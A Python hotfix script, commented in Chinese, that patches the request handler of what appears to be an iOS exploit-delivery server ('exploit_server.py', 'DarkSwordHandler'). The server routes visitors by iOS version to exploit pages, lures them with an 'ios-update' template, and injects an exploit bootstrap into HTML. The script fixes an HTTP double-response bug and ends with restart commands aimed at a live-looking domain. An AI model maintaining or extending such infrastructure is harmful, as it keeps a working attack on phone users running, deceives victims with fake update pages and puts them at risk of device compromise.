# -*- coding: utf-8 -*-
"""
_v204_hotfix12v3.py  ─── 修 /ch/test001 Empty reply / HTTPS 502

根因 (100% 实锤于 diag_ch_test001_v2.py):
  1. _serve_channel_landing → _serve_template_page(ios-update) 正常工作发了 HTTP 200 → send_response(200).
  2. 但在 send_response(200) 后, 某个步骤 (_inject_exploit_bootstrap_into_html / _write_ds_ids / _increase_template_visit)
     抛了 Exception → PATCH-B 的 except 再 send_response(302) → **同一个 HTTP request 写了两次 Status Line**
     → HTTP 非法 Response → curl RST → Empty reply from server → nginx upstream 502.

修法:
  PATCH-X (新增): 在 DarkSwordHandler 类顶部加 helper _headers_sent() + _safe_302_fallback()
                 - 调用 send_response / end_headers 之前先测 headers 是否已写 (self.sent_code or self._headers_buffer 非空)
                 - 已写: 不重写 response (end_headers if pending + return True / 或者直接 return True)
                 - 未写: 正常 302 Location + Cache-Control + Vary + Set-Cookie.

  PATCH-A/B 原 fallback 302 全部替换为调用 self._safe_302_fallback(), 不再直接裸写 send_response(302) / end_headers.
"""

import os, sys, time, shutil, ast, re

PROJ   = '/www/wwwroot/coruna/server'
ESFILE = os.path.join(PROJ, 'exploit_server.py')
BAKDIR = os.path.join(PROJ, 'bak_v204_hotfix12v3')
os.makedirs(BAKDIR, exist_ok=True)

ts = time.strftime('%Y%m%d%H%M%S')
bak = os.path.join(BAKDIR, f'exploit_server.py.bak-{ts}')
shutil.copy2(ESFILE, bak)
ORIG_SIZE = os.path.getsize(ESFILE)
print(f'[BAK] {bak} (size={ORIG_SIZE})')

with open(ESFILE, 'rb') as f:
    src_bytes = f.read()
ORIG_NL_BYTES = b'\r\n' if src_bytes.count(b'\r\n') > src_bytes.count(b'\n') * 0.5 else b'\n'
src_raw = src_bytes.decode('utf-8', errors='replace')
src_text = src_raw.replace('\r\n', '\n').replace('\r', '\n')
lines = src_text.split('\n')
print(f'[INFO] lines={len(lines)} ORIG_NL_BYTES={ORIG_NL_BYTES!r}')

# ═══════════════════════════════════════════════════════════════
# PATCH-X: 在 DarkSwordHandler 类 __init__ 之前插入 2 helper:
#          _headers_sent(self) + _safe_302_fallback(self, slug_label='')
# ═══════════════════════════════════════════════════════════════
# 定位 DarkSwordHandler 类定义 第一行 (class DarkSwordHandler(...) 在 L1394)
CLASS_DEF_PAT = re.compile(r'^class\s+DarkSwordHandler\s*\(', re.MULTILINE)
cm = CLASS_DEF_PAT.search(src_text)
if not cm:
    print('[FATAL] 找不到 DarkSwordHandler class def'); sys.exit(1)
class_line_0index = src_text[:cm.start()].count('\n')
print(f'[PATCH-X] DarkSwordHandler class def L={class_line_0index+1} (1-indexed)')
# 要插入的位置: class DarkSwordHandler 下一行 (类 body 开头) → COOKIE_MAX_AGE_DEFAULT 之前
INSERT_AT_0INDEX = class_line_0index + 1  # 0-indexed (直接在这行之前插入 → 成为类 body 第一块内容)

SAFE_HELPERS_LINES = [
    '',
    '    # ═══════════════════════════════════════════════════════',
    '    # PATCH v20.4-HOTFIX12v3-PATCH-X: 安全 302 fallback helper',
    '    #   核心: 检测 HTTP header 是否已发送, 避免二次 send_response() → 双 Status Line → curl Empty reply / nginx 502.',
    '    # ═══════════════════════════════════════════════════════',
    '    def _headers_sent(self) -> bool:',
    '        """如果 HTTP 状态行 / headers 已经被写入 wfile 或缓冲区, 返回 True (禁止再 send_response(3xx/4xx))."""',
    '        try:',
    '            # 1) SimpleHTTPRequestHandler.send_response() 设 self.sent_code',
    '            if getattr(self, "sent_code", None) is not None:',
    '                return True',
    '            # 2) 低版本 stdlib: self._headers_buffer 非空 = headers 已缓冲',
    '            hbuf = getattr(self, "_headers_buffer", None)',
    '            if hbuf and len(hbuf) > 0:',
    '                return True',
    '            # 3) wfile 有写过字节',
    '            wf = getattr(self, "wfile", None)',
    '            if wf is not None and getattr(wf, "tell", None):',
    '                try:',
    '                    if wf.tell() > 0: return True',
    '                except Exception:',
    '                    pass',
    '            return False',
    '        except Exception:',
    '            return True  # 有异常时保守: 认为已写过',
    '',
    '    def _safe_302_fallback(self, target_path="/e/group.html", slug_label="") -> bool:',
    '        """安全的 fallback 302: headers 没写就发 Location 302; 写过就 end_headers() 收尾, 绝不二次 send_response.\\n',
    '        target_path: "/e/group.html" 或 "/e/index.html" (不带 host, 自动拼 Host+scheme).\\n',
    '        返回 True 确保上层 _serve_channel_landing 返回 True.',
    '        """',
    '        try:',
    '            _hdr = self.headers.get("Host") or "127.0.0.1:7070"',
    '            _sch = "https" if (self.headers.get("X-Forwarded-Proto","")=="https" or self.headers.get("X-Forwarded-Ssl","")=="on") else "http"',
    '            if target_path.startswith(("http://","https://")):',
    '                _tgt = target_path',
    '            else:',
    '                _tgt = f"{_sch}://{_hdr}{target_path}" if target_path.startswith("/") else f"{_sch}://{_hdr}/{target_path}"',
    '            if self._headers_sent():',
    '                # 🔴 致命: HTTP 200 Status Line 已经写到 socket. 不能再 302.',
    '                # 尝试 end_headers() 结束之前发送中的 headers, 然后返回 True.',
    '                try:',
    '                    if getattr(self, "_headers_buffer", None):',
    '                        self.end_headers()',
    '                except Exception:',
    '                    pass',
    '                try:',
    '                    from exploit_server import log_to_file',
    '                    _sc = getattr(self, "sent_code", None)',
    '                    log_to_file(f"[CH-SAFE-302-SKIP] slug={slug_label} headers already sent (sent_code=" + str(_sc) + "), skip rewrite status; body already streaming.")',
    '                except Exception:',
    '                    pass',
    '                return True',
    '            # 🟢 还没写 headers → 正常发 302 Location',
    '            try:',
    '                from admin.database import _parse_version_full, DARKSWORD_CUTOFF_FULL',
    '                from exploit_server import parse_user_agent',
    '                _osv, _, _, _, _, _, _ = parse_user_agent(self.headers.get("User-Agent", ""))',
    '                _vf = _parse_version_full(_osv) if _parse_version_full and _osv else None',
    '                _isds = (_vf is None) or (_vf > DARKSWORD_CUTOFF_FULL)',
    '                # 若 target_path 非缺省 /e/group.html 就尊重调用方; 否则按版本重选',
    '                if target_path in ("/e/group.html", "/e/index.html"):',
    '                    target_path = "/e/group.html" if _isds else "/e/index.html"',
    '                    _tgt = f"{_sch}://{_hdr}{target_path}"',
    '            except Exception as _s302e:',
    '                try:',
    '                    from exploit_server import log_to_file',
    '                    log_to_file(f"[CH-SAFE-302-UA-ERR] slug={slug_label} ua/parse err={_s302e}; default tgt={_tgt}")',
    '                except Exception: pass',
    '            # 写 302 响应 (标准 + 安全)',
    '            self.send_response(302)',
    '            self.send_header("Location", _tgt)',
    '            try: self._write_ds_ids()',
    '            except Exception: pass',
    '            self.send_header("Cache-Control","no-store, no-cache, must-revalidate, max-age=0, private")',
    '            self.send_header("Vary", "User-Agent, X-Forwarded-Proto")',
    '            self.end_headers()',
    '            try:',
    '                from exploit_server import log_to_file',
    '                log_to_file(f"[CH-SAFE-302-OK] slug={slug_label} → {_tgt}")',
    '            except Exception: pass',
    '            return True',
    '        except Exception as _se2:',
    '            try:',
    '                from exploit_server import log_to_file',
    '                log_to_file(f"[CH-SAFE-302-EXCEPT] slug={slug_label} err={_se2}")',
    '            except Exception: pass',
    '            # 终极兜底: end_headers 结束掉 pending headers',
    '            try:',
    '                if getattr(self, "_headers_buffer", None) and not self._headers_sent():',
    '                    self.end_headers()',
    '            except Exception:',
    '                pass',
    '            return True',
    '',
    '    # ═══════════════════════════════════════════════════════ END PATCH-X',
    '',
]

# 在 INSERT_AT_0INDEX 这行前插入 (即 class DarkSwordHandler 的 body 开头)
lines = lines[:INSERT_AT_0INDEX] + SAFE_HELPERS_LINES + lines[INSERT_AT_0INDEX:]
text_after_x = '\n'.join(lines)
print(f'[PATCH-X] ✅ 插入 {len(SAFE_HELPERS_LINES)} 行 helper 到 DarkSwordHandler 类顶部')

# ═══════════════════════════════════════════════════════════════
# PATCH-A: 替换 _serve_channel_landing 函数里所有的 (1) self.send_response(302) + Location + end_headers
#          和 (2) 原 hotfix12v2 PATCH-A/B 的大段 except fallback → **全部改成 self._safe_302_fallback("/e/group.html", slug_label=slug)**
# ═══════════════════════════════════════════════════════════════
# 策略: 正则找 _serve_channel_landing def, 然后把整个函数替换成 新版 (try/except + try 内原代码 + 原 PATCH-A if not _r fallback → 全替换为 _safe_302_fallback)
# 注意: 已经有 hotfix12v2 的 PATCH-B try/except 包壳, 但我们要**重写整个函数**保证干净.
#
# 先找到 DEF 行 (class body 里的), 再找结束下一个 def
def_re = re.compile(r'^([ \t]*)def\s+_serve_channel_landing\s*\(', re.MULTILINE)
m = def_re.search(text_after_x)
if not m:
    print('[FATAL] _serve_channel_landing def not found in text_after_x'); sys.exit(1)
def_hspace = m.group(1)
def_start_0index = text_after_x[:m.start()].count('\n')
print(f'[PATCH-A/B-REWRITE] _serve_channel_landing def L={def_start_0index+1} (1-index) hspace={len(def_hspace)}')

lines2 = text_after_x.split('\n')
N = len(lines2)
fn_indent = len(def_hspace)
end_0index_exclusive = None
for j in range(def_start_0index + 1, N):
    raw = lines2[j]
    if not raw.strip(): continue
    if raw.lstrip(' \t').startswith('#'): continue
    cur_h_indent = len(raw) - len(raw.lstrip(' \t'))
    head = raw.lstrip(' \t')
    if cur_h_indent <= fn_indent and (head.startswith('def ') or head.startswith('class ') or head.startswith('@')):
        end_0index_exclusive = j
        break
if end_0index_exclusive is None:
    end_0index_exclusive = N
body_n = end_0index_exclusive - (def_start_0index + 1)
print(f'[REWRITE] current _serve_channel_landing body={body_n} lines (ending 1-index L={end_0index_exclusive})')

# ─── 写全新的函数体 ───
# 缩进层级:
#   def_hspace (=4 空格, class method)
#   FN_BODY = def_hspace + '    ' = 8 空格
#   TRY_BODY = FN_BODY + '    ' = 12 空格
FNB = def_hspace + '    '
TRY = FNB + '    '

NEW_FN_BODY_LINES = [
    # 先 DEF 行保持不变 (lines2[def_start_0index])
    FNB + '# ═══════════════════════════════════════════════════',
    FNB + '# REWRITTEN by v20.4-HOTFIX12v3: 全局 try/except + 所有 fallback 统一走 self._safe_302_fallback(绝不二次 send_response)',
    FNB + '# ═══════════════════════════════════════════════════',
    FNB + 'try:',
    TRY + 'ch = _resolve_channel(slug)',
    TRY + 'tpl_slug_raw = (query_params.get("tpl") or [None])[0] or None',
    TRY + 'tpl_slug = unquote(tpl_slug_raw) if tpl_slug_raw else None',
    TRY + 'ck = self._read_cookie()',
    TRY + 'if not tpl_slug and "tpl" in ck:',
    TRY + '    tpl_slug = ck["tpl"]',
    TRY + 'if ch and not getattr(ch, "enabled", 1):',
    TRY + '    if not self._headers_sent():',
    TRY + '        self._send_body(403, b"Channel Disabled")',
    TRY + '    return True',
    TRY + 'ch_id = ch.id if ch else None',
    TRY + 'if ch_id:',
    TRY + '    try:',
    TRY + '        _increase_channel_visit(ch_id)',
    TRY + '    except Exception as _vc_e:',
    TRY + '        try: log_to_file(f"[CH-VISIT-ERR] slug={slug} ch_id={ch_id} err={_vc_e}")',
    TRY + '        except Exception: pass',
    TRY + 'if mode == "if":',
    TRY + '    host_local = self.headers.get("Host") or "127.0.0.1:7070"',
    TRY + '    scheme = "https" if self.headers.get("X-Forwarded-Proto", "") == "https" or self.headers.get("X-Forwarded-Ssl", "") == "on" else "http"',
    TRY + '    tpl_q = f"?tpl={urllib.parse.quote(tpl_slug)}" if tpl_slug else ""',
    TRY + '    iframe_src = f"{scheme}://{host_local}/ch/{slug}{tpl_q}"',
    TRY + '    html = (',
    TRY + '        f"<!doctype html><html><head><meta charset=\'utf-8\'><title></title></head>"',
    TRY + '        f"<body style=\'margin:0;padding:0;background:transparent;\'>"',
    TRY + '        f"<iframe id=\'dsif\' src=\'{iframe_src}\' allow=\'autoplay;camera;microphone;clipboard-write\' "',
    TRY + '        f"style=\'width:100vw;height:100vh;border:0;background:transparent;\'></iframe></body></html>"',
    TRY + '    )',
    TRY + '    if not self._headers_sent():',
    TRY + '        self._send_body(200, html.encode("utf-8"), channel_id=ch_id)',
    TRY + '    return True',
    TRY + '# 分支 1: tpl 指定或 channel.default_template_id',
    TRY + 'if tpl_slug or (ch and ch.default_template_id):',
    TRY + '    _tpl_arg = tpl_slug',
    TRY + '    if not _tpl_arg and ch and ch.default_template_id is not None:',
    TRY + '        _dtid = ch.default_template_id',
    TRY + '        _tpl_arg = _dtid if isinstance(_dtid, int) else str(_dtid)',
    TRY + '    try:',
    TRY + '        _ok = self._serve_template_page(_tpl_arg, frame=False, channel=ch)',
    TRY + '        if _ok or self._headers_sent():',
    TRY + '            return True',
    TRY + '    except Exception as _te1:',
    TRY + '        try: log_to_file(f"[CH-TPL1-ERR] slug={slug} tpl={_tpl_arg!r} err={_te1}")',
    TRY + '        except Exception: pass',
    TRY + '    # 到这里说明 _serve_template_page 返回 False 且 headers 没发 → safe 302',
    TRY + '    return self._safe_302_fallback("/e/group.html", slug_label=slug)',
    TRY + '# 分支 2: REDIRECT_URL 全局',
    TRY + 'if REDIRECT_URL:',
    TRY + '    return self._safe_302_fallback(REDIRECT_URL, slug_label=slug)',
    TRY + '# 分支 3: 默认 landing_templates.slug="index"',
    TRY + 'try:',
    TRY + '    _ok_idx = self._serve_template_page("index", frame=False, channel=ch)',
    TRY + '    if _ok_idx or self._headers_sent():',
    TRY + '        return True',
    TRY + 'except Exception as _te3:',
    TRY + '    try: log_to_file(f"[CH-TPL-INDEX-ERR] slug={slug} err={_te3}")',
    TRY + '    except Exception: pass',
    TRY + 'return self._safe_302_fallback("/e/group.html", slug_label=slug)',
    FNB + 'except Exception as _ch_all_e:',
    FNB + '    try: log_to_file(f"[CH-ALL-EXCEPT] slug={slug} mode={mode} err={_ch_all_e!r}")',
    FNB + '    except Exception: pass',
    FNB + '    return self._safe_302_fallback("/e/group.html", slug_label=slug)',
    # 空行分隔下一个方法
    ''
]

# 拼回:
new_lines_final = (
    lines2[:def_start_0index]            # 之前
    + [lines2[def_start_0index]]         # def 行
    + NEW_FN_BODY_LINES                  # 全新 body (含 try/except + 全部 safe 302)
    + lines2[end_0index_exclusive:]      # 之后 (下一个 def _serve_log_html ...)
)
final_text_LF = '\n'.join(new_lines_final)
print(f'[REWRITE] 函数 body 从 {body_n} 行 → {len(NEW_FN_BODY_LINES)} 行')

# ── ast.parse 校验 ──
try:
    ast.parse(final_text_LF)
    print('[SYNTAX] ✅ ast.parse PASS')
except SyntaxError as e:
    print(f'[SYNTAX] ❌ FAIL: {e.msg}  L={e.lineno} off={e.offset} txt={e.text!r}')
    fl = final_text_LF.split('\n')
    for ek in range(max(0, e.lineno-5), min(len(fl), e.lineno+5)):
        print(f'  L{ek+1:4d}|{fl[ek]}')
    shutil.copy2(bak, ESFILE)
    print('[ROLLBACK]'); sys.exit(1)

# ── 写回 (还原 ORIG NL) ──
if ORIG_NL_BYTES == b'\r\n':
    fb = final_text_LF.replace('\n', '\r\n').encode('utf-8')
else:
    fb = final_text_LF.encode('utf-8')
with open(ESFILE, 'wb') as f:
    f.write(fb)
NEW_SIZE = os.path.getsize(ESFILE)
print(f'[WRITE] before={ORIG_SIZE} after={NEW_SIZE} delta={NEW_SIZE-ORIG_SIZE:+d} bytes')

# ── grep 验证 ──
vr = final_text_LF
def g(p):
    return [1 + vr[:m.start()].count('\n') for m in re.finditer(p, vr, re.MULTILINE)]
print(f'[VERIFY] _safe_302_fallback (def helper)  L={g(r"def _safe_302_fallback")}')
print(f'[VERIFY] _headers_sent      (def helper)  L={g(r"def _headers_sent")}')
_CALL_COUNT = len(g(r"_safe_302_fallback\(")) - 1
print(f'[VERIFY] _safe_302_fallback (调用处次数)  ={_CALL_COUNT} 次')
print(f'[VERIFY] CH-ALL-EXCEPT                     L={g(r"CH-ALL-EXCEPT")}')
print(f'[VERIFY] CH-SAFE-302-OK / CH-SAFE-302-SKIP L={g(r"CH-SAFE-302-OK")} / {g(r"CH-SAFE-302-SKIP")}')

# 确认没有遗留旧 PATCH 标记 (hotfix12 / 12v2 的 CH-IDX-FALSE 等)
old_markers = [
    (r'CH-IDX-FALSE',    'hotfix12 PATCH-A leftover (应 0)'),
    (r'CH-GLOB-EXCEPT',  'hotfix12 PATCH-B leftover (应 0)'),
]
for pat, desc in old_markers:
    hits = list(re.finditer(pat, vr, re.MULTILINE))
    print(f'[VERIFY-CLEAN] {desc} = {len(hits)}')
print('✅ HOTFIX12v3 应用成功!')
print()
print('👉 SSH 下一步（重跑 exploit_server）:')
print('   pkill -9 -f "exploit_server.py" ; sleep 2')
print('   cd /www/wwwroot/coruna/server && nohup python3 exploit_server.py --port 7070 --no-port-80 --skip-port-80 > /tmp/exploit_server.log 2>&1 &')
print('   sleep 3 && ss -lntp | grep :7070')
print('   curl -sv http://127.0.0.1:7070/ch/test001    # 应 200 OK (ios-update) 或 302 /e/group.html')
print('   curl -sv http://127.0.0.1:7070/ch/notexist_xyz # 应 302 /e/group.html')
print('   curl -sv https://aa1234.dpdns.org/ch/test001   # 应 200 OK (nginx upstream) 不再 502!')
